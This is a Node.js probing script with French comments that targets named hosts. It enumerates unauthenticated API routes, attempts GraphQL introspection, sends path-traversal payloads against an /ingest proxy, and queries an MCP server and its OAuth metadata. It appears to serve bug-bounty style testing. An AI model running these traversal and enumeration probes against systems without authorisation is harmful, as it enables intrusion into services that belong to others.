// Controles NON authentifies (aucun jeton necessaire) :
//  1) enumeration des routes /api/* de l'app web
//  2) introspection GraphQL sans auth sur l'API
//  3) traversee de chemin sur le proxy /ingest
//  4) comportement non authentifie du serveur MCP + metadonnees de ressource
import fs from "fs";
const APP = "https://bugsecure.senintel.sn";
const API = "https://bugsecure-api.senintel.sn";
const MCP = "https://bugsecure-mcp.senintel.sn";
const UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0 Safari/537.36";
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const out = [];
async function hit(url, o = {}) {
  const t0 = Date.now();
  try {
    const r = await fetch(url, { method: o.m || "GET", headers: { "User-Agent": UA, "Content-Type": "application/json", ...(o.h || {}) }, body: o.b ? (typeof o.b === "string" ? o.b : JSON.stringify(o.b)) : undefined, redirect: "manual" });
    const t = await r.text();
    const rec = { url, s: r.status, ms: Date.now() - t0, ct: (r.headers.get("content-type") || "").split(";")[0], loc: r.headers.get("location") || "", body: t.slice(0, 220) };
    out.push(rec);
    return rec;
  } catch (e) {
    const rec = { url, s: 0, ms: Date.now() - t0, body: "ERR " + (e.cause?.code || e.message) };
    out.push(rec);
    return rec;
  }
}
const short = (r) => String(r.s).padEnd(4) + r.ms.toString().padStart(5) + "ms " + (r.ct || "-").padEnd(22) + r.url.replace("https://", "").padEnd(58) + r.body.replace(/\s+/g, " ").slice(0, 96);

console.log("=== 1) routes /api/* de l'app web (sans auth) ===");
const apiPaths = [
  "/api/auth/session/refresh", "/api/auth/session", "/api/auth/session/logout", "/api/auth/csrf",
  "/api/upload", "/api/uploads", "/api/upload-url", "/api/webhook", "/api/webhooks", "/api/s3",
  "/api/avatar", "/api/avatar/upload", "/api/report", "/api/reports", "/api/profile", "/api/me",
  "/api/user", "/api/users", "/api/admin", "/api/org", "/api/organizations", "/api/kudos",
  "/api/graphql", "/api/health", "/api/status", "/api/version", "/api/config", "/api/env",
  "/api/session", "/api/auth/totp", "/api/auth/2fa", "/api/auth/mfa", "/api/auth/logout",
  "/api/invitations", "/api/approve", "/api/agent", "/api/agents", "/api/export", "/api/import",
  "/api/search", "/api/notification", "/api/notifications", "/api/certificate", "/api/payout",
];
for (const p of apiPaths) { const r = await hit(APP + p); console.log(short(r)); await sleep(90); }
console.log("--- POST /api/auth/session/refresh (comportement attendu) ---");
console.log(short(await hit(APP + "/api/auth/session/refresh", { m: "POST", b: "{}" })));

console.log("\n=== 2) introspection GraphQL SANS auth sur l'API ===");
const intro = await hit(API + "/graphql", { m: "POST", b: { query: "{ __schema { types { name } mutationType { fields { name } } } }" } });
console.log(short(intro));
console.log("   extrait:", intro.body.slice(0, 200));
const intro2 = await hit(API + "/graphql", { m: "POST", b: { query: "{ __schema { queryType { fields { name } } } }" } });
console.log(short(intro2));
console.log("   extrait:", intro2.body.slice(0, 200));

console.log("\n=== 3) traversee de chemin sur le proxy /ingest ===");
const trav = [
  "/ingest/../api/auth/session/refresh",
  "/ingest/%2e%2e/api/auth/session/refresh",
  "/ingest/..%2f..%2fapi/",
  "/ingest//api/projects",
  "/ingest/api/projects/../../../../api/",
  "/ingest;/api/projects",
  "/ingest/api/projects/../users",
  "/ingest/api/../api/users",
];
for (const p of trav) {
  const r = await hit(APP + p); console.log(short(r)); await sleep(90);
}

console.log("\n=== 4) serveur MCP : comportement sans jeton + metadonnees de ressource ===");
for (const p of ["/mcp", "/", "/.well-known/oauth-protected-resource", "/.well-known/oauth-protected-resource/mcp", "/.well-known/openid-configuration", "/health", "/sse"]) {
  const r = await hit(MCP + p); console.log(short(r)); await sleep(90);
}
console.log("--- POST /mcp sans jeton (que renvoie-t-il ?) ---");
const m1 = await hit(MCP + "/mcp", { m: "POST", h: { "Content-Type": "application/json", Accept: "application/json, text/event-stream" }, b: { jsonrpc: "2.0", id: 1, method: "initialize", params: { protocolVersion: "2025-06-18", capabilities: {}, clientInfo: { name: "probe", version: "0" } } } });
console.log(short(m1));
console.log("   extrait:", m1.body.slice(0, 300));

console.log("\n=== 5) AS : metadonnees serveur + CIMD (document public de reference) ===");
for (const p of ["/.well-known/oauth-authorization-server", "/.well-known/oauth-protected-resource", "/oauth/register", "/oauth/authorize"]) {
  const r = await hit(API + p); console.log(short(r)); await sleep(90);
}

fs.writeFileSync("/tmp/opencode/unauth-probe.json", JSON.stringify(out, null, 1));
console.log("\njournal ecrit : /tmp/opencode/unauth-probe.json (" + out.length + " requetes)");
